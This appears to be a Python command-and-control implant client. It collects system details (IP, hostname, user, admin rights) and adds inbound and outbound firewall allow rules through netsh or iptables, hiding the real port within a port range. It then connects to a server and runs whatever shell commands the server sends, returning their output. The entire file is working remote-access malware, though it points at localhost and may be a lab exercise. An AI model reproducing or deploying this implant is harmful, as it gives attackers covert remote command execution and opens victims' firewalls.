# Don't run this on a dev box unless you want your firewall open!
import socket
import os
import subprocess
import platform
import ctypes
import getpass
import sys

SERVER='localhost'
SERVER_PORT=9999
PORT_RADIUS=200
FIREWALL_NAME="Allow Python C2 Outbound"
BUFFER_SIZE=4096
DEBUG=True

class style():
  RED       = '\033[31m'
  GREEN     = '\033[32m'
  BLUE      = '\033[34m'
  RESET     = '\033[0m'

def is_elevated():
    if os.name == 'nt':  # Windows
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:  # Unix/Linux/macOS
        return os.geteuid() == 0

def get_ip_address():
    try:
        # Gets the actual IP address by connecting to a public IP
        # Use a UDP socket to avoid sending actual data
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except:
        return "Unavailable"

def close_connection(client_sock, msg="no message specified"):
    msg = msg.strip()
    try:
        msg_to_send = f"KILL_R {msg}"
        if DEBUG:
            print(f"Sending: {msg_to_send}")
        # Server may or may not receive this, as it only listens for KILL_R events after KILL. That's okay.
        client_sock.send(msg_to_send.encode())
    except Exception:
        pass  # Avoid double-fault if socket is already closed
    finally:
        client_sock.close()
        if DEBUG:
            print(f"EXIT: {msg}")
        sys.exit(1)

def firewall_rule_exists_win(rule_name):
    try:
        result = subprocess.run(
            f'netsh advfirewall firewall show rule name="{rule_name}"',
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True
        )
        return result.returncode == 0 and rule_name.lower() in result.stdout.lower()
        #return result.returncode == 0
    except Exception as e:
        if DEBUG:
            print(f"Error checking rule on Windows firewall: {str(e)}")
        return False

def iptables_rule_exists(chain, port_range):
    """Check if the iptables rule already exists."""
    port_flag = '--sport' if chain == 'INPUT' else '--dport'
    cmd = f'iptables -C {chain} -p tcp {port_flag} {port_range} -j ACCEPT'
    try:
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.returncode == 0
    except Exception as e:
        if DEBUG:
            print(f"Error checking rule on iptables: {str(e)}")
        return False

'''
Punches a hole in the firewall with a configurable port range with the real port hiding in the center
'''
def open_firewall():
    if DEBUG:
        print(f"Opening firewall")
        
    if PORT_RADIUS != 0:
        port_min = SERVER_PORT - PORT_RADIUS
        port_max = SERVER_PORT + PORT_RADIUS
        port_range = f"{port_min}-{port_max}"
    else:
        port_range = str(SERVER_PORT)

    try:
        if os.name == 'nt':  # Windows
            
            # Allow inbound traffic
            inbound_name = f"{FIREWALL_NAME} Inbound"
            if not firewall_rule_exists_win(inbound_name):
                subprocess.run(
                    f'netsh advfirewall firewall add rule name="{FIREWALL_NAME} Inbound" dir=in action=allow protocol=TCP remoteport={port_range}',
                    shell=True
                )
            # Allow outbound traffic
            outbound_name = f"{FIREWALL_NAME} Outbound"
            if not firewall_rule_exists_win(outbound_name):
                subprocess.run(
                    f'netsh advfirewall firewall add rule name="{FIREWALL_NAME} Outbound" dir=out action=allow protocol=TCP remoteport={port_range}',
                    shell=True
                )
        else: # iptables
            # Uses default input/output chains on default table and inserts our rules at the top
            # iptables needs 80:81 format instead of 80-81
            port_range = port_range.replace('-',':')
            # Allow inbound traffic
            if not iptables_rule_exists('INPUT', port_range):
                subprocess.run(
                    f'iptables -I INPUT 1 -p tcp --sport {port_range} -j ACCEPT',
                    shell=True
                )
            # Allow outbound traffic
            if not iptables_rule_exists('OUTPUT', port_range):
                subprocess.run(
                    f'iptables -I OUTPUT 1 -p tcp --dport {port_range} -j ACCEPT',
                    shell=True
                )
    except Exception as e:
        if DEBUG:
            print(f"Error when setting up firewall: {str(e)}")

def main():

    # Gather basic system info
    sys_os = platform.system()
    hostname = socket.gethostname()
    ipaddress = get_ip_address()
    try:
        cur_user = os.getlogin()
    except OSError:
        # getlogin can fail in services/cron; fallback:
        cur_user = getpass.getuser()
    elevated = is_elevated()
    sys_info = f"REG {ipaddress} | {hostname} | {sys_os} | {cur_user} | {elevated}"

    # Poke a hole in the firewall
    open_firewall()

    # Connect to the server
    try:
        client_sock = socket.socket()
        client_sock.connect((SERVER,SERVER_PORT))
    except Exception as e:
        close_connection(client_sock,f"Error creating socket or connecting to server at {SERVER} {SERVER_PORT} - {str(e)}")
    if DEBUG:
        print(f"Connected to server {SERVER} {SERVER_PORT}")
    
    try:
        # Send register message to server
        # client_sock.send(b"Hello Server!") # b before makes it bytes (needed for network), or do "a".encode()
        if DEBUG:
            print(f"Sending: {sys_info}")
        client_sock.send(sys_info.encode())
        response = client_sock.recv(BUFFER_SIZE).decode()
        if DEBUG:
            print(f"Received: {response}")
        if not response.startswith("REG_R"):
            raise ValueError("Did not receive expected REG_R from server")

        # Await input from server and execute
        while True:
            try:
                response = client_sock.recv(BUFFER_SIZE).decode().strip()
                if not response:
                    raise ConnectionResetError  # Socket closed on server side
                if DEBUG:
                    print(f"Received: {response}")
                
                if response.startswith("CMD "):
                    # Give it 60 seconds to run before failing
                    command = response[len("CMD "):]
                    if DEBUG:
                        print(f"Running command: {command}")
                    # dns_server_lines = subprocess.run(['grep','nameserver'], input=etc_resolve_output, stdout=subprocess.PIPE, text=True).stdout.splitlines()
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
                    #result = subprocess.run("whoami", shell=True, capture_output=True, text=True, timeout=60)
                    # output = result.stdout + result.stderr
                    #output = f"CMD_R {result.returncode} | {result.stdout.strip().replace('\n', '\t')} | {result.stderr.strip().replace('\n', '\t')}"
                    output = f"CMD_R {result.returncode} | {result.stdout.strip()} | {result.stderr.strip()}"
                    if DEBUG:
                        print(f"Sending: {output}")
                    client_sock.send(output.encode())

                if response.startswith("KILL"):
                    close_connection(client_sock,"server requested kill")

                if response.startswith("PING"):
                    if DEBUG:
                        print(f"Sending: PONG")
                    client_sock.send("PONG".encode())

            except subprocess.TimeoutExpired:
                output = "CMD_R 124 | Command timed out | Command timed out"
                if DEBUG:
                    print(f"Sending: {output}")
                client_sock.send(output.encode())
            except Exception as e:
                #print(f"Unexpected error: {e}")
                close_connection(client_sock, f"Handled Exception: {str(e)}")
                return
    except (ConnectionResetError, ConnectionAbortedError):
        close_connection(client_sock,"Client has lost connection to server.")
    except Exception as e:
        # Graceful exit before crash
        close_connection(client_sock,f"Handled Exception: {str(e)}")

main()